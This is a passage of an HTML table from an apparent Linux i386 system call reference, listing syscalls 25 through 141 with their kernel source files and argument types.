         <td>sys_stime</td>
         <td><a href=
            "file:///usr/src/linux/kernel/time.c">kernel/time.c</a></td>
         <td>int *</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>26</td>
         <td>sys_ptrace</td>
         <td><a href=
            "file:///usr/src/linux/arch/i386/kernel/ptrace.c">arch/i386/kernel/ptrace.c</a></td>
         <td>long</td>
         <td>long</td>
         <td>long</td>
         <td>long</td>
         <td>-</td>
      </tr>
      <tr>
         <td>27</td>
         <td>sys_alarm</td>
         <td><a href=
            "file:///usr/src/linux/kernel/sched.c">kernel/sched.c</a></td>
         <td>unsigned int</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>28</td>
         <td>sys_fstat</td>
         <td><a href=
            "file:///usr/src/linux/fs/stat.c">fs/stat.c</a></td>
         <td>unsigned int</td>
         <td><a href="#__old_kernel_stat">struct
            __old_kernel_stat *</a>
         </td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>29</td>
         <td>sys_pause</td>
         <td><a href=
            "file:///usr/src/linux/arch/i386/kernel/sys_i386.c">arch/i386/kernel/sys_i386.c</a></td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>30</td>
         <td>sys_utime</td>
         <td><a href=
            "file:///usr/src/linux/fs/open.c">fs/open.c</a></td>
         <td>char *</td>
         <td><a href="#utimbuf">struct utimbuf *</a></td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>33</td>
         <td>sys_access</td>
         <td><a href=
            "file:///usr/src/linux/fs/open.c">fs/open.c</a></td>
         <td>const char *</td>
         <td>int</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>34</td>
         <td>sys_nice</td>
         <td><a href=
            "file:///usr/src/linux/kernel/sched.c">kernel/sched.c</a></td>
         <td>int</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>36</td>
         <td>sys_sync</td>
         <td><a href=
            "file:///usr/src/linux/fs/buffer.c">fs/buffer.c</a></td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>37</td>
         <td>sys_kill</td>
         <td><a href=
            "file:///usr/src/linux/kernel/signal.c">kernel/signal.c</a></td>
         <td>int</td>
         <td>int</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>38</td>
         <td>sys_rename</td>
         <td><a href=
            "file:///usr/src/linux/fs/namei.c">fs/namei.c</a></td>
         <td>const char *</td>
         <td>const char *</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>39</td>
         <td>sys_mkdir</td>
         <td><a href=
            "file:///usr/src/linux/fs/namei.c">fs/namei.c</a></td>
         <td>const char *</td>
         <td>int</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>40</td>
         <td>sys_rmdir</td>
         <td><a href=
            "file:///usr/src/linux/fs/namei.c">fs/namei.c</a></td>
         <td>const char *</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>41</td>
         <td>sys_dup</td>
         <td><a href=
            "file:///usr/src/linux/fs/fcntl.c">fs/fcntl.c</a></td>
         <td>unsigned int</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>42</td>
         <td>sys_pipe</td>
         <td><a href=
            "file:///usr/src/linux/arch/i386/kernel/sys_i386.c">arch/i386/kernel/sys_i386.c</a></td>
         <td>unsigned long *</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>43</td>
         <td>sys_times</td>
         <td><a href=
            "file:///usr/src/linux/kernel/sys.c">kernel/sys.c</a></td>
         <td><a href="#tms">struct tms *</a></td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>45</td>
         <td>sys_brk</td>
         <td><a href=
            "file:///usr/src/linux/mm/mmap.c">mm/mmap.c</a></td>
         <td>unsigned long</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>46</td>
         <td>sys_setgid</td>
         <td><a href=
            "file:///usr/src/linux/kernel/sys.c">kernel/sys.c</a></td>
         <td><a href="#gid_t">gid_t</a></td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>47</td>
         <td>sys_getgid</td>
         <td><a href=
            "file:///usr/src/linux/kernel/sched.c">kernel/sched.c</a></td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>48</td>
         <td>sys_signal</td>
         <td><a href=
            "file:///usr/src/linux/kernel/signal.c">kernel/signal.c</a></td>
         <td>int</td>
         <td><a href=
            "#__sighandler_t">__sighandler_t</a></td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>49</td>
         <td>sys_geteuid</td>
         <td><a href=
            "file:///usr/src/linux/kernel/sched.c">kernel/sched.c</a></td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>50</td>
         <td>sys_getegid</td>
         <td><a href=
            "file:///usr/src/linux/kernel/sched.c">kernel/sched.c</a></td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>51</td>
         <td>sys_acct</td>
         <td><a href=
            "file:///usr/src/linux/kernel/acct.c">kernel/acct.c</a></td>
         <td>const char *</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>52</td>
         <td>sys_umount</td>
         <td><a href=
            "file:///usr/src/linux/fs/super.c">fs/super.c</a></td>
         <td>char *</td>
         <td>int</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>54</td>
         <td>sys_ioctl</td>
         <td><a href=
            "file:///usr/src/linux/fs/ioctl.c">fs/ioctl.c</a></td>
         <td>unsigned int</td>
         <td>unsigned int</td>
         <td>unsigned long</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>55</td>
         <td>sys_fcntl</td>
         <td><a href=
            "file:///usr/src/linux/fs/fcntl.c">fs/fcntl.c</a></td>
         <td>unsigned int</td>
         <td>unsigned int</td>
         <td>unsigned long</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>57</td>
         <td>sys_setpgid</td>
         <td><a href=
            "file:///usr/src/linux/kernel/sys.c">kernel/sys.c</a></td>
         <td><a href="#pid_t">pid_t</a></td>
         <td><a href="#pid_t">pid_t</a></td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>59</td>
         <td>sys_olduname</td>
         <td><a href=
            "file:///usr/src/linux/arch/i386/kernel/sys_i386.c">arch/i386/kernel/sys_i386.c</a></td>
         <td><a href="#oldold_utsname">struct
            oldold_utsname *</a>
         </td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>60</td>
         <td>sys_umask</td>
         <td><a href=
            "file:///usr/src/linux/kernel/sys.c">kernel/sys.c</a></td>
         <td>int</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>61</td>
         <td>sys_chroot</td>
         <td><a href=
            "file:///usr/src/linux/fs/open.c">fs/open.c</a></td>
         <td>const char *</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>62</td>
         <td>sys_ustat</td>
         <td><a href=
            "file:///usr/src/linux/fs/super.c">fs/super.c</a></td>
         <td><a href="#dev_t">dev_t</a></td>
         <td><a href="#ustat">struct ustat *</a></td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>63</td>
         <td>sys_dup2</td>
         <td><a href=
            "file:///usr/src/linux/fs/fcntl.c">fs/fcntl.c</a></td>
         <td>unsigned int</td>
         <td>unsigned int</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>64</td>
         <td>sys_getppid</td>
         <td><a href=
            "file:///usr/src/linux/kernel/sched.c">kernel/sched.c</a></td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>65</td>
         <td>sys_getpgrp</td>
         <td><a href=
            "file:///usr/src/linux/kernel/sys.c">kernel/sys.c</a></td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>66</td>
         <td>sys_setsid</td>
         <td><a href=
            "file:///usr/src/linux/kernel/sys.c">kernel/sys.c</a></td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>67</td>
         <td>sys_sigaction</td>
         <td><a href=
            "file:///usr/src/linux/arch/i386/kernel/signal.c">arch/i386/kernel/signal.c</a></td>
         <td>int</td>
         <td>const <a href="#old_sigaction">struct
            old_sigaction *</a>
         </td>
         <td><a href="#old_sigaction">struct old_sigaction
            *</a>
         </td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>68</td>
         <td>sys_sgetmask</td>
         <td><a href=
            "file:///usr/src/linux/kernel/signal.c">kernel/signal.c</a></td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>69</td>
         <td>sys_ssetmask</td>
         <td><a href=
            "file:///usr/src/linux/kernel/signal.c">kernel/signal.c</a></td>
         <td>int</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>70</td>
         <td>sys_setreuid</td>
         <td><a href=
            "file:///usr/src/linux/kernel/sys.c">kernel/sys.c</a></td>
         <td><a href="#uid_t">uid_t</a></td>
         <td><a href="#uid_t">uid_t</a></td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>71</td>
         <td>sys_setregid</td>
         <td><a href=
            "file:///usr/src/linux/kernel/sys.c">kernel/sys.c</a></td>
         <td><a href="#gid_t">gid_t</a></td>
         <td><a href="#gid_t">gid_t</a></td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>72</td>
         <td>sys_sigsuspend</td>
         <td><a href=
            "file:///usr/src/linux/arch/i386/kernel/signal.c">arch/i386/kernel/signal.c</a></td>
         <td>int</td>
         <td>int</td>
         <td><a href="#old_sigset_t">old_sigset_t</a></td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>73</td>
         <td>sys_sigpending</td>
         <td><a href=
            "file:///usr/src/linux/kernel/signal.c">kernel/signal.c</a></td>
         <td><a href="#old_sigset_t">old_sigset_t
            *</a>
         </td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>74</td>
         <td>sys_sethostname</td>
         <td><a href=
            "file:///usr/src/linux/kernel/sys.c">kernel/sys.c</a></td>
         <td>char *</td>
         <td>int</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>75</td>
         <td>sys_setrlimit</td>
         <td><a href=
            "file:///usr/src/linux/kernel/sys.c">kernel/sys.c</a></td>
         <td>unsigned int</td>
         <td><a href="#rlimit">struct rlimit *</a></td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>76</td>
         <td>sys_getrlimit</td>
         <td><a href=
            "file:///usr/src/linux/kernel/sys.c">kernel/sys.c</a></td>
         <td>unsigned int</td>
         <td><a href="#rlimit">struct rlimit *</a></td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>77</td>
         <td>sys_getrusage</td>
         <td><a href=
            "file:///usr/src/linux/kernel/sys.c">kernel/sys.c</a></td>
         <td>int</td>
         <td><a href="#rusage">struct rusage *</a></td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>78</td>
         <td>sys_gettimeofday</td>
         <td><a href=
            "file:///usr/src/linux/kernel/time.c">kernel/time.c</a></td>
         <td><a href="#timeval">struct timeval *</a></td>
         <td><a href="#timezone">struct timezone *</a></td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>79</td>
         <td>sys_settimeofday</td>
         <td><a href=
            "file:///usr/src/linux/kernel/time.c">kernel/time.c</a></td>
         <td><a href="#timeval">struct timeval *</a></td>
         <td><a href="#timezone">struct timezone *</a></td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>80</td>
         <td>sys_getgroups</td>
         <td><a href=
            "file:///usr/src/linux/kernel/sys.c">kernel/sys.c</a></td>
         <td>int</td>
         <td><a href="#gid_t">gid_t *</a></td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>81</td>
         <td>sys_setgroups</td>
         <td><a href=
            "file:///usr/src/linux/kernel/sys.c">kernel/sys.c</a></td>
         <td>int</td>
         <td><a href="#gid_t">gid_t *</a></td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>82</td>
         <td>old_select</td>
         <td><a href=
            "file:///usr/src/linux/arch/i386/kernel/sys_i386.c">arch/i386/kernel/sys_i386.c</a></td>
         <td><a href="#sel_arg_struct">struct
            sel_arg_struct *</a>
         </td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>83</td>
         <td>sys_symlink</td>
         <td><a href=
            "file:///usr/src/linux/fs/namei.c">fs/namei.c</a></td>
         <td>const char *</td>
         <td>const char *</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>84</td>
         <td>sys_lstat</td>
         <td><a href=
            "file:///usr/src/linux/fs/stat.c">fs/stat.c</a></td>
         <td>char *</td>
         <td><a href="#__old_kernel_stat">struct
            __old_kernel_stat *</a>
         </td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>85</td>
         <td>sys_readlink</td>
         <td><a href=
            "file:///usr/src/linux/fs/stat.c">fs/stat.c</a></td>
         <td>const char *</td>
         <td>char *</td>
         <td>int</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>86</td>
         <td>sys_uselib</td>
         <td><a href=
            "file:///usr/src/linux/fs/exec.c">fs/exec.c</a></td>
         <td>const char *</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>87</td>
         <td>sys_swapon</td>
         <td><a href=
            "file:///usr/src/linux/mm/swapfile.c">mm/swapfile.c</a></td>
         <td>const char *</td>
         <td>int</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>88</td>
         <td>sys_reboot</td>
         <td><a href=
            "file:///usr/src/linux/kernel/sys.c">kernel/sys.c</a></td>
         <td>int</td>
         <td>int</td>
         <td>int</td>
         <td>void *</td>
         <td>-</td>
      </tr>
      <tr>
         <td>89</td>
         <td>old_readdir</td>
         <td><a href=
            "file:///usr/src/linux/fs/readdir.c">fs/readdir.c</a></td>
         <td>unsigned int</td>
         <td>void *</td>
         <td>unsigned int</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>90</td>
         <td>old_mmap</td>
         <td><a href=
            "file:///usr/src/linux/arch/i386/kernel/sys_i386.c">arch/i386/kernel/sys_i386.c</a></td>
         <td><a href="#mmap_arg_struct">struct
            mmap_arg_struct *</a>
         </td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>91</td>
         <td>sys_munmap</td>
         <td><a href=
            "file:///usr/src/linux/mm/mmap.c">mm/mmap.c</a></td>
         <td>unsigned long</td>
         <td><a href="#size_t">size_t</a></td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>92</td>
         <td>sys_truncate</td>
         <td><a href=
            "file:///usr/src/linux/fs/open.c">fs/open.c</a></td>
         <td>const char *</td>
         <td>unsigned long</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>93</td>
         <td>sys_ftruncate</td>
         <td><a href=
            "file:///usr/src/linux/fs/open.c">fs/open.c</a></td>
         <td>unsigned int</td>
         <td>unsigned long</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>94</td>
         <td>sys_fchmod</td>
         <td><a href=
            "file:///usr/src/linux/fs/open.c">fs/open.c</a></td>
         <td>unsigned int</td>
         <td><a href="#mode_t">mode_t</a></td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>95</td>
         <td>sys_fchown</td>
         <td><a href=
            "file:///usr/src/linux/fs/open.c">fs/open.c</a></td>
         <td>unsigned int</td>
         <td><a href="#uid_t">uid_t</a></td>
         <td><a href="#gid_t">gid_t</a></td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>96</td>
         <td>sys_getpriority</td>
         <td><a href=
            "file:///usr/src/linux/kernel/sys.c">kernel/sys.c</a></td>
         <td>int</td>
         <td>int</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>97</td>
         <td>sys_setpriority</td>
         <td><a href=
            "file:///usr/src/linux/kernel/sys.c">kernel/sys.c</a></td>
         <td>int</td>
         <td>int</td>
         <td>int</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>99</td>
         <td>sys_statfs</td>
         <td><a href=
            "file:///usr/src/linux/fs/open.c">fs/open.c</a></td>
         <td>const char *</td>
         <td><a href="#statfs">struct statfs *</a></td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>100</td>
         <td>sys_fstatfs</td>
         <td><a href=
            "file:///usr/src/linux/fs/open.c">fs/open.c</a></td>
         <td>unsigned int</td>
         <td><a href="#statfs">struct statfs *</a></td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>101</td>
         <td>sys_ioperm</td>
         <td><a href=
            "file:///usr/src/linux/arch/i386/kernel/ioport.c">arch/i386/kernel/ioport.c</a></td>
         <td>unsigned long</td>
         <td>unsigned long</td>
         <td>int</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>102</td>
         <td>sys_socketcall</td>
         <td><a href=
            "file:///usr/src/linux/net/socket.c">net/socket.c</a></td>
         <td>int</td>
         <td>unsigned long *</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>103</td>
         <td>sys_syslog</td>
         <td><a href=
            "file:///usr/src/linux/kernel/printk.c">kernel/printk.c</a></td>
         <td>int</td>
         <td>char *</td>
         <td>int</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>104</td>
         <td>sys_setitimer</td>
         <td><a href=
            "file:///usr/src/linux/kernel/itimer.c">kernel/itimer.c</a></td>
         <td>int</td>
         <td><a href="#itimerval">struct itimerval
            *</a>
         </td>
         <td><a href="#itimerval">struct itimerval
            *</a>
         </td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>105</td>
         <td>sys_getitimer</td>
         <td><a href=
            "file:///usr/src/linux/kernel/itimer.c">kernel/itimer.c</a></td>
         <td>int</td>
         <td><a href="#itimerval">struct itimerval
            *</a>
         </td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>106</td>
         <td>sys_newstat</td>
         <td><a href=
            "file:///usr/src/linux/fs/stat.c">fs/stat.c</a></td>
         <td>char *</td>
         <td><a href="#stat">struct stat *</a></td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>107</td>
         <td>sys_newlstat</td>
         <td><a href=
            "file:///usr/src/linux/fs/stat.c">fs/stat.c</a></td>
         <td>char *</td>
         <td><a href="#stat">struct stat *</a></td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>108</td>
         <td>sys_newfstat</td>
         <td><a href=
            "file:///usr/src/linux/fs/stat.c">fs/stat.c</a></td>
         <td>unsigned int</td>
         <td><a href="#stat">struct stat *</a></td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>109</td>
         <td>sys_uname</td>
         <td><a href=
            "file:///usr/src/linux/arch/i386/kernel/sys_i386.c">arch/i386/kernel/sys_i386.c</a></td>
         <td><a href="#old_utsname">struct old_utsname
            *</a>
         </td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>110</td>
         <td>sys_iopl</td>
         <td><a href=
            "file:///usr/src/linux/arch/i386/kernel/ioport.c">arch/i386/kernel/ioport.c</a></td>
         <td>unsigned long</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>111</td>
         <td>sys_vhangup</td>
         <td><a href=
            "file:///usr/src/linux/fs/open.c">fs/open.c</a></td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>112</td>
         <td>sys_idle</td>
         <td><a href=
            "file:///usr/src/linux/arch/i386/kernel/process.c">arch/i386/kernel/process.c</a></td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>113</td>
         <td>sys_vm86old</td>
         <td><a href=
            "file:///usr/src/linux/arch/i386/kernel/vm86.c">arch/i386/kernel/vm86.c</a></td>
         <td>unsigned long</td>
         <td><a href="#vm86plus_struct">struct
            vm86plus_struct *</a>
         </td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>114</td>
         <td>sys_wait4</td>
         <td><a href=
            "file:///usr/src/linux/kernel/exit.c">kernel/exit.c</a></td>
         <td><a href="#pid_t">pid_t</a></td>
         <td>unsigned long *</td>
         <td>int options</td>
         <td><a href="#rusage">struct rusage *</a></td>
         <td>-</td>
      </tr>
      <tr>
         <td>115</td>
         <td>sys_swapoff</td>
         <td><a href=
            "file:///usr/src/linux/mm/swapfile.c">mm/swapfile.c</a></td>
         <td>const char *</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>116</td>
         <td>sys_sysinfo</td>
         <td><a href=
            "file:///usr/src/linux/kernel/info.c">kernel/info.c</a></td>
         <td><a href="#sysinfo">struct sysinfo *</a></td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>117</td>
         <td>sys_ipc <a href="#note117">(*Note)</a></td>
         <td><a href=
            "file:///usr/src/linux/arch/i386/kernel/sys_i386.c">arch/i386/kernel/sys_i386.c</a></td>
         <td><a href="#uint">uint</a></td>
         <td>int</td>
         <td>int</td>
         <td>int</td>
         <td>void *</td>
      </tr>
      <tr>
         <td>118</td>
         <td>sys_fsync</td>
         <td><a href=
            "file:///usr/src/linux/fs/buffer.c">fs/buffer.c</a></td>
         <td>unsigned int</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>119</td>
         <td>sys_sigreturn</td>
         <td><a href=
            "file:///usr/src/linux/arch/i386/kernel/signal.c">arch/i386/kernel/signal.c</a></td>
         <td>unsigned long</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>120</td>
         <td>sys_clone</td>
         <td><a href=
            "file:///usr/src/linux/arch/i386/kernel/process.c">arch/i386/kernel/process.c</a></td>
         <td><a href="#pt_regs">struct pt_regs</a></td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>121</td>
         <td>sys_setdomainname</td>
         <td><a href=
            "file:///usr/src/linux/kernel/sys.c">kernel/sys.c</a></td>
         <td>char *</td>
         <td>int</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>122</td>
         <td>sys_newuname</td>
         <td><a href=
            "file:///usr/src/linux/kernel/sys.c">kernel/sys.c</a></td>
         <td><a href="#new_utsname">struct new_utsname
            *</a>
         </td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>123</td>
         <td>sys_modify_ldt</td>
         <td><a href=
            "file:///usr/src/linux/arch/i386/kernel/ldt.c">arch/i386/kernel/ldt.c</a></td>
         <td>int</td>
         <td>void *</td>
         <td>unsigned long</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>124</td>
         <td>sys_adjtimex</td>
         <td><a href=
            "file:///usr/src/linux/kernel/time.c">kernel/time.c</a></td>
         <td><a href="#timex">struct timex *</a></td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>125</td>
         <td>sys_mprotect</td>
         <td><a href=
            "file:///usr/src/linux/mm/mprotect.c">mm/mprotect.c</a></td>
         <td>unsigned long</td>
         <td><a href="#size_t">size_t</a></td>
         <td>unsigned long</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>126</td>
         <td>sys_sigprocmask</td>
         <td><a href=
            "file:///usr/src/linux/kernel/signal.c">kernel/signal.c</a></td>
         <td>int</td>
         <td><a href="#old_sigset_t">old_sigset_t
            *</a>
         </td>
         <td><a href="#old_sigset_t">old_sigset_t
            *</a>
         </td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>127</td>
         <td>sys_create_module</td>
         <td><a href=
            "file:///usr/src/linux/kernel/module.c">kernel/module.c</a></td>
         <td>const char *</td>
         <td><a href="#size_t">size_t</a></td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>128</td>
         <td>sys_init_module</td>
         <td><a href=
            "file:///usr/src/linux/kernel/module.c">kernel/module.c</a></td>
         <td>const char *</td>
         <td><a href="#module">struct module *</a></td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>129</td>
         <td>sys_delete_module</td>
         <td><a href=
            "file:///usr/src/linux/kernel/module.c">kernel/module.c</a></td>
         <td>const char *</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>130</td>
         <td>sys_get_kernel_syms</td>
         <td><a href=
            "file:///usr/src/linux/kernel/module.c">kernel/module.c</a></td>
         <td><a href="#kernel_sym">struct kernel_sym
            *</a>
         </td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>131</td>
         <td>sys_quotactl</td>
         <td><a href=
            "file:///usr/src/linux/fs/dquot.c">fs/dquot.c</a></td>
         <td>int</td>
         <td>const char *</td>
         <td>int</td>
         <td><a href="#caddr_t">caddr_t</a></td>
         <td>-</td>
      </tr>
      <tr>
         <td>132</td>
         <td>sys_getpgid</td>
         <td><a href=
            "file:///usr/src/linux/kernel/sys.c">kernel/sys.c</a></td>
         <td><a href="#pid_t">pid_t</a></td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>133</td>
         <td>sys_fchdir</td>
         <td><a href=
            "file:///usr/src/linux/fs/open.c">fs/open.c</a></td>
         <td>unsigned int</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>134</td>
         <td>sys_bdflush</td>
         <td><a href=
            "file:///usr/src/linux/fs/buffer.c">fs/buffer.c</a></td>
         <td>int</td>
         <td>long</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>135</td>
         <td>sys_sysfs</td>
         <td><a href=
            "file:///usr/src/linux/fs/super.c">fs/super.c</a></td>
         <td>int</td>
         <td>unsigned long</td>
         <td>unsigned long</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>136</td>
         <td>sys_personality</td>
         <td><a href=
            "file:///usr/src/linux/kernel/exec_domain.c">kernel/exec_domain.c</a></td>
         <td>unsigned long</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>138</td>
         <td>sys_setfsuid</td>
         <td><a href=
            "file:///usr/src/linux/kernel/sys.c">kernel/sys.c</a></td>
         <td><a href="#uid_t">uid_t</a></td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>139</td>
         <td>sys_setfsgid</td>
         <td><a href=
            "file:///usr/src/linux/kernel/sys.c">kernel/sys.c</a></td>
         <td><a href="#gid_t">gid_t</a></td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>140</td>
         <td>sys_llseek</td>
         <td><a href=
            "file:///usr/src/linux/fs/read_write.c">fs/read_write.c</a></td>
         <td>unsigned int</td>
         <td>unsigned long</td>
         <td>unsigned long</td>
         <td><a href="#loff_t">loff_t *</a></td>
         <td>unsigned int</td>
      </tr>
      <tr>
         <td>141</td>
         <td>sys_getdents</td>
         <td><a href=
            "file:///usr/src/linux/fs/readdir.c">fs/readdir.c</a></td>
         <td>unsigned int</td>
         <td>void *</td>
         <td>unsigned int</td>
         <td>-</td>
         <td>-</td>
      </tr>
      <tr>
         <td>142</td>
